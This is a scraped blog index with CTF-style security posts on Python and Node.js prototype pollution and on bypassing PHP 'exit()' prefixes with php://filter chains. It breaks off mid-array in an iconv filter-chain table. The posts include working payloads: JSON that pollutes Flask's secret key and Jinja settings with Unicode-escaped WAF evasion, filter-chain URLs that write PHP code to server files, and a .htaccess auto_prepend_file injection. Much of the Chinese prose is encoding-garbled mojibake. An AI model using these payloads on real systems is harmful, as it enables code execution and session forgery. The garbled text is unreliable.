\u0026#34;os\u0026#34;:{ \u0026#34;path\u0026#34;:{ \u0026#34;pardir\u0026#34;:\u0026#34;,\u0026#34; } } } } } SSTI jinja2æ±¡æŸ“ #\rè¿™é‡Œå°±åªè´´å‡ºæ¶æ„é“¾ï¼Œä¸å…·ä½“åˆ†æäº†ï¼Œå…¶å®å°±æ˜¯èµ°çš„sstiçš„åº•å±‚ï¼Œå»æ”¹æ‰æ¨¡æ¿çš„æ ‡è¯†ç¬¦\n{ \u0026#34;__init__\u0026#34; : { \u0026#34;__globals__\u0026#34; : { \u0026#34;app\u0026#34; : { \u0026#34;jinja_env\u0026#34; :{ \u0026#34;variable_start_string\u0026#34; : \u0026#34;[[\u0026#34;,\u0026#34;variable_end_string\u0026#34;:\u0026#34;]]\u0026#34; } } } } èµ›é¢˜ #\rCTFshowè¥¿ç“œæ¯ #\rfrom flask import Flask, session, redirect, url_for,request,render_template import os import hashlib import json import re def generate_random_md5(): random_string = os.urandom(16) md5_hash = hashlib.md5(random_string) return md5_hash.hexdigest() def filter(user_input): blacklisted_patterns = [\u0026#39;init\u0026#39;, \u0026#39;global\u0026#39;, \u0026#39;env\u0026#39;, \u0026#39;app\u0026#39;, \u0026#39;_\u0026#39;, \u0026#39;string\u0026#39;] for pattern in blacklisted_patterns: if re.search(pattern, user_input, re.IGNORECASE): return True return False def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) app = Flask(__name__) app.secret_key = generate_random_md5() class evil(): def __init__(self): pass @app.route(\u0026#39;/\u0026#39;,methods=[\u0026#39;POST\u0026#39;]) def index(): username = request.form.get(\u0026#39;username\u0026#39;) password = request.form.get(\u0026#39;password\u0026#39;) session[\u0026#34;username\u0026#34;] = username session[\u0026#34;password\u0026#34;] = password Evil = evil() if request.data: if filter(str(request.data)): return \u0026#34;NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~\u0026#34; else: merge(json.loads(request.data), Evil) return \u0026#34;MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED\u0026#34; return render_template(\u0026#34;index.html\u0026#34;) @app.route(\u0026#39;/admin\u0026#39;,methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def templates(): username = session.get(\u0026#34;username\u0026#34;, None) password = session.get(\u0026#34;password\u0026#34;, None) if username and password: if username == \u0026#34;adminer\u0026#34; and password == app.secret_key: return render_template(\u0026#34;flag.html\u0026#34;, flag=open(\u0026#34;/flag\u0026#34;, \u0026#34;rt\u0026#34;).read()) else: return \u0026#34;Unauthorized\u0026#34; else: return f\u0026#39;Hello, This is the POLLUTED page.\u0026#39; if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000) pythonçš„åŸå‹é“¾æ±¡æŸ“ï¼Œéœ€è¦æŠŠapp.secret_keyæ±¡æŸ“æˆä¸€ä¸ªæˆ‘ä»¬æƒ³è¦çš„å€¼ï¼Œæ¥ç€æŠŠ _static_folderçš„è·¯å¾„æ±¡æŸ“æˆæœåŠ¡å™¨çš„æ ¹ç›®å½•ï¼Œå®ç°ä»»æ„æ–‡ä»¶è¯»å–ä»è€Œå¾—åˆ°flagã€‚ å› ä¸ºæœ‰wafæ‰€ä»¥è¿™é‡Œå°±unicodeä¸€ä¸‹\n{ \u0026#34;\\u005F\\u005F\\u0069\\u006E\\u0069\\u0074\\u005F\\u005F\u0026#34;: { \u0026#34;\\u005F\\u005F\\u0067\\u006C\\u006F\\u0062\\u0061\\u006C\\u0073\\u005F\\u005F\u0026#34;: { \u0026#34;\\u0061\\u0070\\u0070\u0026#34;: { \u0026#34;\\u006A\\u0069\\u006E\\u006A\\u0061\\u005F\\u0065\\u006E\\u0076\u0026#34;: { \u0026#34;\\u0076\\u0061\\u0072\\u0069\\u0061\\u0062\\u006C\\u0065\\u005F\\u0073\\u0074\\u0061\\u0072\\u0074\\u005F\\u0073\\u0074\\u0072\\u0069\\u006E\\u0067\u0026#34;: \u0026#34;[#\u0026#34;, \u0026#34;\\u0076\\u0061\\u0072\\u0069\\u0061\\u0062\\u006C\\u0065\\u005F\\u0065\\u006E\\u0064\\u005F\\u0073\\u0074\\u0072\\u0069\\u006E\\u0067\u0026#34;: \u0026#34;#]\u0026#34; }, \u0026#34;config\u0026#34; : { \u0026#34;\\u0053\\u0045\\u0043\\u0052\\u0045\\u0054\\u005F\\u004B\\u0045\\u0059\u0026#34; :\u0026#34;password\u0026#34; } } } } } ç„¶åå‘åŒ…ä¼ªé€ seesionå³å¯\nDownUnderCTF 2024 - co2 #\råœ¨utilsä¸­\ndef merge(src, dst): for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) å†™äº†ä¸€ä¸ªmerge\n@app.route(\u0026#34;/save_feedback\u0026#34;, methods=[\u0026#34;POST\u0026#34;]) @login_required def save_feedback(): data = json.loads(request.data) feedback = Feedback() # Because we want to dynamically grab the data and save it attributes we can merge it and it *should* create those attribs for the object. merge(data, feedback) save_feedback_to_disk(feedback) return jsonify({\u0026#34;success\u0026#34;: \u0026#34;true\u0026#34;}), 200 å¹¶ä¸”åœ¨è¿™é‡Œè¿›è¡Œäº†è°ƒç”¨\n@app.route(\u0026#34;/get_flag\u0026#34;) @login_required def get_flag(): if flag == \u0026#34;true\u0026#34;: return \u0026#34;DUCTF{NOT_THE_REAL_FLAG}\u0026#34; else: return \u0026#34;Nope\u0026#34; åªéœ€è¦æ±¡æŸ“flagçš„boolå€¼å³å¯\n{ \u0026#34;__init__\u0026#34; : { \u0026#34;__globals__\u0026#34; : { \u0026#34;flag\u0026#34; : \u0026#34;true\u0026#34; } } } æ€»ç»“ #\råŸå‹é“¾æ±¡æŸ“æŒºå¥½ç©çš„hhhï¼Œä¸çŸ¥é“å…¶ä»–è¯­è¨€æœ‰æ²¡æœ‰è¿™ä¸ªæ´å˜ã€‚\n","date":"11 July 2024","externalUrl":null,"permalink":"/posts/python-prototype-chain-pollution/","section":"Posts","summary":"","title":"Python Prototype chains pollution","type":"posts"},{"content":"Before writing #\rBecause of procastinating, I have been for a long time to write some eassy in my blog. But rencently i decide to recover it. So i start to write it down in English.\nPrefix Content #\rWith some foundation data, we can acknowledge it more accurately.\nThe concept of Synchronous and Asynchronous #\rThe Asynchronous like when you are reading, and eating at the same time. Synchronous is you do something one by one without time overlap.\nFS in Node.js #\rso in Node.js, which have a module titled fs, have two function to use: readFileSync() and readFile().(The former is a synchronous function and the latter is an asynchronous function.)\npretending we have a file named dt.txt and the content in it is \u0026ldquo;DT you should get more exercise\u0026rdquo;ã€‚ like this and we could use those function to read the content.\nAsynchronous :\nvar fs = require(\u0026#39;fs\u0026#39;); fs.readFile(\u0026#39;dt.txt\u0026#39;,function(err,data){ if(err){ return console.error(err); } console.log(\u0026#34;Asynchronous read:\u0026#34;+data.toString()); }); Synchronous:\nvar fs = require(\u0026#39;fs\u0026#39;); var data = fs.readFileSync(\u0026#39;dt.txt\u0026#39;); console.log(\u0026#34;Synchronous read: \u0026#34; + data.toString()); The module of child_process #\rThis module give us some function to create child process.\nSynchronous : spawn exec execFile fork Asynchornous:spawnSync execSync execFileSync when we us Asychronous to create process, spawn is others basis, and when we use Synchronous to create it, we can use child_process.spwanSync()ã€child_process.execSync() and child_process.execFileSync()\nPrototype chain #\rtwo key word : prototype and proto\nprototype #\rIn JavaScript, the prototype object is an important mechanism for implementing object-oriented programming.It is unique to functions. It points to an object from a function. Its meaning is the prototype object of the function, that is, the prototype object of the instance created by this function (in fact, all functions can be used as constructors).\nand we can make some example\nfunction Food(bar,bar1,bar2) { this.bar = 1; this.bar1=5; } let food = new Food(); Food.prototype.bar2=6; console.log(food.bar1); console.log(food.bar2); //5 //6 as you can see, we can use property: prototype to point to this prototype function to create bar2, and we use food to inherit Food which is a class. so the food have the property : bar2 =\u0026gt; 6\nproto #\rAs we can concerned, if some class have been instantiated, you wiil not visit its prototype object by function prototype. In this case, we can use function proto to visit it\u0026rsquo;s prototype object.\nso we can do like this :\nfunction Food(bar,bar1,bar2) { this.bar = 1; this.bar1=5; } let food = new Food(); console.log(Food.prototype===food.__proto__); Prototype chain\u0026rsquo;s conception #\ruse the fromer example\nfunction Food() { this.bar = 1; this.bar1=5; } function food(){ this.bar=2; } food.prototype = new Food(); let food1 = new food(); console.log(food1.bar); console.log(food1.bar1); when we print food1.bar and food1.bar1. The Search order is like:\nfirst we search in it original class, it hava property bar=2 so it can print it like : 2 and we want to print property bar1 in it, but as we see, it not appear in its class, and we define food.prototype = new Food(), so it will search in it\u0026#39;s prototype object , so it will print : 5 and this searching structure named prototype chain.\nPrototype chain pollution #\rwe use phith0n\u0026rsquo;s example\n// fooæ˜¯ä¸€ä¸ªç®€å•çš„JavaScriptå¯¹è±¡ let foo = {bar: 1} // foo.bar æ­¤æ—¶ä¸º1 console.log(foo.bar) // ä¿®æ”¹fooçš„åŸå‹ï¼ˆå³Objectï¼‰ foo.__proto__.bar = 2 // ç”±äºæŸ¥æ‰¾é¡ºåºçš„åŸå› ï¼Œfoo.barä»ç„¶æ˜¯1 console.log(foo.bar) // æ­¤æ—¶å†ç”¨Objectåˆ›å»ºä¸€ä¸ªç©ºçš„zooå¯¹è±¡ let zoo = {} // æŸ¥çœ‹zoo.bar console.log(zoo.bar) so there is an question: why the property in zoo.bar is 2?? When we output zoo.bar, the node.js engine starts to search in zoo. If it is not found, it searches in zoo.proto, that is, in Object. And, our foo.proto.bar = 2, is to give Object adds a bar attribute, and this attribute is inherited by zoo.This kind of modification of the prototype object of a certain object to control the operation of other objects is prototype chain pollution.\n","date":"7 July 2024","externalUrl":null,"permalink":"/posts/node-js-prototype-chain-pollution/","section":"Posts","summary":"","title":"Node JS Prototype chain pollution","type":"posts"},{"content":"","date":"7 July 2024","externalUrl":null,"permalink":"/tags/nodejs/","section":"Tags","summary":"","title":"Nodejs","type":"tags"},{"content":"","date":"14 April 2024","externalUrl":null,"permalink":"/tags/bashfuck/","section":"Tags","summary":"","title":"BashFuck","type":"tags"},{"content":"","date":"14 April 2024","externalUrl":null,"permalink":"/tags/bypass/","section":"Tags","summary":"","title":"Bypass","type":"tags"},{"content":"0x0eå‰è¨€ #\rè¿™ä¸ªfilterchainä¹‹å‰å·²ç»å­¦è¿‡äº†ï¼Œä½†æ˜¯iconvå’Œæ­»äº¡æ‚ç³…çš„çŸ¥è¯†ç‚¹æ˜¯åˆ†å¼€å­¦çš„ï¼Œè€Œä¸”ä¹Ÿæœ‰ä¸€æ®µæ—¶é—´äº†ï¼Œæ‰€ä»¥æ‰“ç®—å†™ä¸€ç¯‡æ€»ç»“èµ·æ¥å­¦ä¹ å¯èƒ½ä¼šå¥½ä¸€ç‚¹\n0x01å‰ç½®çŸ¥è¯† #\rBase64ç¼–ç ä¸è§£ç  #\rå¯èƒ½åˆšåˆšå…¥é—¨CTFçš„å¸ˆå‚…éƒ½çŸ¥é“base64æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Œä½†æ˜¯ä¸çŸ¥é“å®ƒçš„å·¥ä½œåŸç†ã€‚ base64ç¼–ç å­—ç¬¦è¡¨å¦‚ä¸‹ã€‚ Encode Process #\rå¯ä»¥çœ‹è§å¯¹äºSunæ¥ç¼–ç ï¼Œé¦–å…ˆå°±æ˜¯å°†ä¸‰ä¸ªå­—èŠ‚æ‹†å¼€æ¥ï¼Œå†ç»„åˆæœ€ååˆ†æˆ8bitè¿›è¡Œç¼–ç ï¼Œæ‰€ä»¥å¾ˆæ¸…æ¥šå°±èƒ½çŸ¥é“base64çš„ç¼–ç è¿‡ç¨‹å°±æ˜¯ä¸æ–­æ‹†å¼€å’Œç»„åˆã€‚å¹¶ä¸”å¾ˆæ¸…æ¥šçœ‹è§base64æ˜¯3ä¸ªå­—ç¬¦3ä¸ªå­—ç¬¦è¿›è¡Œç¼–ç çš„ï¼Œå½“ä¸è¶³çš„æ—¶å€™ä¼šç”¨=ï¼›æ¥è¡¥é½ example:\n\u0026lt;? $data = \u0026#34;Delete\u0026#34;; echo base64_encode($data); //=\u0026gt;RGVsZXRl $data = \u0026#34;Delet\u0026#34;; echo base64_encode($data); //=\u0026gt;RGVsZXQ= ?\u0026gt; Decode Process #\ré‚£ä¹ˆç›¸åï¼Œä½ å°±ä¼šå‘ç°è§£ç è¿‡ç¨‹å°±æ˜¯ç¼–ç çš„é€†è¿ç®—ï¼Œä½†æ˜¯base64æ˜¯ä»¥4ä¸ª8bitçš„æ•°æ®è¿›è¡Œè§£ç å¹¶ä¸”ä»…å¯¹æœ‰æ•ˆå­—ç¬¦è¿›è¡Œè§£ç ï¼Œæ‰€ä»¥è¿™ä¸ªåœ°æ–¹è®°ä½ï¼Œåœ¨åé¢çš„çŸ¥è¯†ç‚¹éœ€è¦åˆ©ç”¨è¿™ä¸ªçŸ¥è¯†ç‚¹.\n0x02æ­»äº¡æ‚ç³… #\rä¸‰ç§æƒ…å†µï¼š file_put_contents($filename,\u0026quot;\u0026lt;?php exit();\u0026quot;.$content);\nfile_put_contents($content,\u0026quot;\u0026lt;?php exit();\u0026quot;.$content);\nfile_put_contents($filename,$content . \u0026quot;\\nxxxxxx\u0026quot;);\nç¬¬ä¸€ç§ï¼ˆæ–‡ä»¶åå’Œå‚æ•°å¯æ§ï¼‰ #\rbase64 #\r$filename=\u0026#39;php://filter/convert.base64decode/resource=delete.php\u0026#39;; $content = \u0026#39;aPD9waHAgcGhwaW5mbygpOw==\u0026#39;; åœ¨å‰é¢åŠ ä¸€ä¸ªaæ˜¯å› ä¸ºå‰é¢çš„è§£ç çš„åŸå› ï¼Œè¦å‡‘4ä¸ªå­—ç¬¦æ¥ æµ‹è¯•æºç ï¼š\n\u0026lt;?php $filename = $_GET[\u0026#39;filename\u0026#39;]; $content = $_GET[\u0026#39;content\u0026#39;]; file_put_contents($filename,\u0026#34;\u0026lt;?php exit();\u0026#34;.$content); ?\u0026gt; ä¼ å‚ï¼š http://127.0.0.1/2.php?filename=php://filter/convert.base64-decode/resource=delete.php\u0026amp;content=aPD9waHAgcGhwaW5mbygpOw== å¯ä»¥å‘ç° å†™å…¥æˆåŠŸï¼Œå¦‚æœä¸è¡¥é½çš„è¯å°±ä¼šä¹±ç å°±æ²¡åŠæ³•è§£æäº† è¡¥é½ä¹‹å‰ä¸º31ä¸ªå­—ç¬¦ï¼Œè¡¥åå°±æ˜¯32ä¸ªåˆšå¥½æ˜¯4çš„å€æ•°ï¼Œæ‰€ä»¥å¯ä»¥è§£æ\nrot13 #\rè¿™é‡Œæˆ‘å…ˆé™„ä¸Šè½¬åŒ–çš„è„šæœ¬\n# time : 2024/1/12 # author : DELETE import string result = [] upperCase = string.ascii_uppercase lowerCase= string.ascii_lowercase upperDict={} lowerDict={} print(\u0026#34;welcome to decode rot-13!\\n\u0026#34;) inputStr=input(\u0026#34;please input what you want to decode\\n\u0026#34;) while True: print(f\u0026#34;please comfirm {inputStr} is what you want to input if yes input y if not input n\u0026#34;) flag=input(\u0026#34;è¯·ç¡®è®¤\u0026#34;) if(flag==\u0026#39;y\u0026#39;) or (flag ==\u0026#39;Y\u0026#39;): break if(flag==\u0026#39;n\u0026#39;) or (flag==\u0026#39;N\u0026#39;): inputStr=input(\u0026#34;please input what string you want to encode or decode!\u0026#34;) else: print(\u0026#34;comfir way is illegal\u0026#34;) break for i in range(0,len(upperCase)): if i \u0026lt; 13: upperDict[upperCase[i]]=upperCase[i+13] else: upperDict[upperCase[i]]=upperCase[i-13] for i in range(0,len(lowerCase)): if i \u0026lt; 13: lowerDict[lowerCase[i]]=lowerCase[i+13] else: lowerDict[lowerCase[i]]=lowerCase[i-13] for ch in inputStr: if ch in lowerCase: result.append(lowerDict[ch]) elif ch in upperDict: result.append(upperDict[ch]) result=\u0026#34;\u0026#34;.join(result) print(f\u0026#34;final decode result is {result}\u0026#34;) è¿™é‡Œæ„é€ ä¸€ä¸‹ç¼–ç å†…å®¹åå°±æ˜¯\u0026lt;?cuc cucvasb();?\u0026gt; è¿™é‡Œæˆ‘ä»¬ç›´æ¥åšplayloadä¼  å¯ä»¥çœ‹è§ä¹Ÿæ˜¯ä¸Šä¼ äº†ä¸è¿‡è¿™é‡Œæœ‰ä¸ªé—®é¢˜å°±æ˜¯å‰é¢å·²ç»æœ‰ä¸€ä¸ªæ ‡ç­¾äº†æ‰€ä»¥å¦‚æœæœåŠ¡å™¨å¼€äº†çŸ­æ ‡ç­¾ï¼Œå°±æ²¡åŠæ³•è§£æäº† .htaccessé¢„åŒ…å« #\r$filename=php://filter/write=string.strip_tags/resource=.htaccess $content=?\u0026gt;php_value%20auto_prepend_file%20delete.php æ³¨æ„ï¼šstring.strip_tagsåœ¨php7.3.0ä¸­è¢«å¼ƒç”¨äº†ï¼Œæ‰€ä»¥ä¼šæŠ¥é”™ï¼ˆä¸è¿‡å¥½åƒphpstudyå¯ä»¥å†™å…¥)å¹¶ä¸”æ³¨æ„ä¸‹å°½é‡åœ¨dockerèµ·ç¯å¢ƒï¼Œå¥½åƒphpstudyä½ ä¼ å°±ä¼š500åŒ…å«ä¸äº†ã€‚ å…¶å®å¾ˆç®€å•çš„å°±èƒ½ç†è§£ï¼Œå…¶å®å°±æ˜¯åšäº†ä¸€ä¸ªæ–‡ä»¶åŒ…å«ï¼Œå…ˆé—­åˆäº†æ­»äº¡ä»£ç åé¢å†™å…¥è‡ªå®šä¹‰æ–‡ä»¶ CTFä¸­å¯ä»¥çŒœflagçš„è·¯å¾„ä»è€Œå®ŒæˆåŒ…å«ï¼Œé™¤äº†å¯ä»¥ç®€å•åŒ…å«ï¼Œä¹Ÿæ˜¯å¯ä»¥åˆ©ç”¨ä¼ªåè®®æˆ–è€…utf-7è¿›è¡ŒåŒ…å«\nç»„åˆæ‹³ #\rè¿™é‡Œå°±ç›´æ¥è´´å‡ºæ¥s1mpleå¸ˆå‚…çš„ä¸€äº›åˆ©ç”¨æ–¹å¼ä¸åšåˆ†æ 1ã€\n$filename=\u0026#39;php://filter/string.strip_tags|convert.base64-decode/resource=s1mple.php\u0026#39; $content=\u0026#39;?\u0026gt;PD9waHAgcGhwaW5mbygpOz8+\u0026#39; 2ã€\n$filename=php://filter/zlib.deflate|string.tolower|zlib.inflate|/resource=s1mple.php $content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?\u0026gt;\u0026lt;?php%0dphpinfo();?\u0026gt;/resource=s1mple.php ç¬¬äºŒç§(å…±ç”¨ä¸€ä¸ªå˜é‡) #\ré¦–å…ˆè¿™é‡Œæ”¾å‡ºs1ampleå¸ˆå‚…çš„ä¸€ç§æ‰“æ³• åœ¨phpä¸ä¸º7çš„æ¡ä»¶ä¸‹\n?content=php://filter/write=string.strip_tags/?\u0026gt;php_value%20auto_prepend_file%20G:\\s1mple.php%0a%23/resource=.htaccess å…¶å®ä¹Ÿå°±æ˜¯å†™å…¥.htaccessè¿›è¡Œé¢„åŒ…å«å’Œå‰é¢çš„åŸç†æ˜¯ä¸€æ ·çš„\nå…³äºç›´æ¥ä½¿ç”¨Base64çš„æ€è€ƒ #\råœ¨è¿™ä¸ªçŸ¥è¯†ç‚¹ä¸Šï¼Œå¾ˆå¤šå¸ˆå‚…éƒ½æ²¡æœ‰æˆåŠŸã€‚ æ¯”å¦‚Cyc1eå¸ˆå‚…å†™çš„\nphp//filter/write=convertbase64decodePD9waHAgcGhwaW5mbygpOz8+/resource=Cyc1e.php s1mapleå¸ˆå‚…å†™çš„ï¼š\nphp://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php é—®é¢˜å°±åœ¨äºbase64åœ¨è§£ç çš„æ—¶å€™å°†=ä½œä¸ºäº†è§£ç æœ«å°¾çš„åˆ¤æ–­ï¼Œå¦‚æœå‡ºç°çš„è¯åé¢çš„å­—ç¬¦å°±æ— æ³•è¢«è§£ç ä¹Ÿå°±æ— æ³•æ„æˆéœ€è¦çš„ä»£ç ã€‚ äºæ˜¯æˆ‘å»ç¿»äº†ä¸€ä¸‹phpä¸­å…³äºbase64è§£ç çš„éƒ¨åˆ†å‡½æ•°çš„ä»£ç å¦‚ä¸‹\nstatic zend_always_inline int php_base64_decode_impl(const unsigned char *in, size_t inl, unsigned char *out, size_t *outl, bool strict) /* {{{ */ { int ch; size_t i = 0, padding = 0, j = *outl; #if defined(__aarch64__) || defined(_M_ARM64) if (inl \u0026gt;= 16 * 4) { size_t left = 0; j += neon_base64_decode(in, inl, out, \u0026amp;left); i = inl - left; in += i; inl = left; } #endif /* run through the whole string, converting as we go */ while (inl-- \u0026gt; 0) { ch = *in++; if (ch == base64_pad) { padding++; continue; } ch = base64_reverse_table[ch]; if (!strict) { /* skip unknown characters and whitespace */ if (ch \u0026lt; 0) { continue; } } else { /* skip whitespace */ if (ch == -1) { continue; } /* fail on bad characters or if any data follows padding */ if (ch == -2 || padding) { goto fail; } } switch (i % 4) { case 0: out[j] = ch \u0026lt;\u0026lt; 2; break; case 1: out[j++] |= ch \u0026gt;\u0026gt; 4; out[j] = (ch \u0026amp; 0x0f) \u0026lt;\u0026lt; 4; break; case 2: out[j++] |= ch \u0026gt;\u0026gt;2; out[j] = (ch \u0026amp; 0x03) \u0026lt;\u0026lt; 6; break; case 3: out[j++] |= ch; break; } i++; } /* fail if the input is truncated (only one char in last group) */ if (strict \u0026amp;\u0026amp; i % 4 == 1) { goto fail; } /* fail if the padding length is wrong (not VV==, VVV=), but accept zero padding * RFC 4648: \u0026#34;In some circumstances, the use of padding [--] is not required\u0026#34; */ if (strict \u0026amp;\u0026amp; padding \u0026amp;\u0026amp; (padding \u0026gt; 2 || (i + padding) % 4 != 0)) { goto fail; } *outl = j; out[j] = \u0026#39;\\0\u0026#39;; return 1; fail: return 0; } æ³¨æ„åˆ°if (!strict)è¿™ä¸ªåˆ¤æ–­ï¼Œä¹Ÿå°±æ˜¯åœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹ä»–å°±ä¼šå¯¹æœªçŸ¥å­—ç¬¦å’Œç©ºç™½å­—ç¬¦è¿›è¡Œè·³è¿‡ï¼Œç„¶åè¿™ä¸ªåœ°æ–¹æˆ‘ä¹Ÿå»ç”¨gptè¾…åŠ©äº†ä¸€ä¸‹ï¼Œå¯ä»¥åœ¨phpç¯å¢ƒå˜é‡ä¹‹ä¸­å°†å…¶æ”¹ä¸ºéä¸¥æ ¼æ¨¡å¼å°±å¯ä»¥å¯¹=å·çš„å†…å®¹ç»§ç»­è§£ç ï¼Œæ‰€ä»¥æˆ‘å°±å»èµ·äº†ä¸€ä¸ªdockerï¼Œä½†æ˜¯è¿˜æ˜¯æ‰“ä¸é€šï¼Œæ–‡ä»¶å¯ä»¥ç”Ÿæˆä½†æ˜¯æ²¡åŠæ³•å†™å…¥å†…å®¹å°±å¾ˆå¥‡æ€ªï¼Œï¼ˆæ‰€ä»¥åœ¨è¿™é‡Œè¿˜æ˜¯æ–­äº†ï¼‰ã€‚\nå»æ‰ç­‰å·ä¹‹è¿‡æ»¤å™¨åµŒå¥—base64 #\rè¿™é‡ŒS1mapleå¸ˆå‚…çš„playloadï¼šphp://filter/write=string.strip_tags|convert.base64-decode/resource=?\u0026gt;PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php è¿™é‡Œåˆ©ç”¨äº†ä¼ªç›®å½•çš„æ–¹æ³•è®©ä»–ç”Ÿæˆæ­£å¸¸çš„æ–‡ä»¶å å¦ç±»base64 #\rplayload:\nphp://filter/\u0026lt;?|string.strip_tags|convert.base64-decode/resource=?\u0026gt;PD9waHAgcGhwaW5mbygpOz8%2B/../delete.php è¿™é‡Œçš„æ€è·¯å°±æ˜¯å°†=å·å†™åˆ°phpçš„æ ‡è¯†ç¬¦ä¸­è¿›è¡Œè¿‡æ»¤æ‰ç„¶åå†è¿›è¡Œè½¬ç å†åˆ†è§£æ­»äº¡ä»£ç \nrot13 #\rè¿™ä¸ªç›¸å¯¹äºbase64å°±ä¸æ˜¯åˆ©ç”¨ç‰¹æ€§ç»•è¿‡ï¼Œæ‰€ä»¥ç›¸å¯¹äºå¥½ç”¨ä¸€äº›\nphp://filter/write=string.rot13|\u0026lt;?cuc cucvasb();?\u0026gt;|/resource=delete.php 0x03iconvè½¬æ¢ #\rå› ä¸ºè¿™ä¸ªçŸ¥è¯†ç‚¹Zeddå¸ˆå‚…å•ç‹¬å†™äº†ä¸€ç¯‡æ–‡ç« ï¼Œæ‰€ä»¥æˆ‘è§‰å¾—è¿™é‡Œä¸ä»…å¯ä»¥ç»•æ­»äº¡ä»£ç ä¹Ÿå¯ä»¥ç”¨äºæ–‡ä»¶åŒ…å«å½“ä¸­ï¼Œäºæ˜¯æˆ‘å°†å…¶ä½œä¸ºå•ç‹¬çš„ä¸€ä¸ªçŸ¥è¯†ç‚¹åˆ†å‡ºï¼Œä½†æ˜¯è¿˜æ˜¯å¯ä»¥ç»•è¿‡ç¬¬äºŒç±»çš„æ­»äº¡ä»£ç çš„ #æœ¬è´¨ä¸Šä¹Ÿå’Œbase64çš„ç‰¹æ€§æœ‰æŒ‚é’©ï¼Œä¹Ÿæ˜¯ä¸æ–­çš„å»ç¼–ç è§£ç æ¥è·å–æˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿ è¿™é‡Œæˆ‘å°±æ‹¿Zeddå¸ˆå‚…å…¶ä¸­çš„ä¸€æ®µæˆ‘è®¤ä¸ºæ¯”è¾ƒæœ‰ä»£è¡¨æ€§çš„ä»£ç å—è´´å‡ºæ¥\n\u0026lt;?php $base64_payload = \u0026#34;PD89YCRfR0VUWzBdYDs7Pz4\u0026#34;; $conversions = array( \u0026#39;R\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2\u0026#39;, \u0026#39;B\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2\u0026#39;, \u0026#39;C\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.CSISO2022KR\u0026#39;, \u0026#39;8\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2\u0026#39;, \u0026#39;9\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB\u0026#39;, \u0026#39;f\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213\u0026#39;, \u0026#39;s\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61\u0026#39;, \u0026#39;z\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS\u0026#39;, \u0026#39;U\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932\u0026#39;, \u0026#39;P\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213\u0026#39;, \u0026#39;V\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5\u0026#39;, \u0026#39;0\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2\u0026#39;, \u0026#39;Y\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2\u0026#39;, \u0026#39;W\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2\u0026#39;, \u0026#39;d\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2\u0026#39;, \u0026#39;D\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2\u0026#39;, \u0026#39;7\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2\u0026#39;, \u0026#39;4\u0026#39; =\u0026gt; 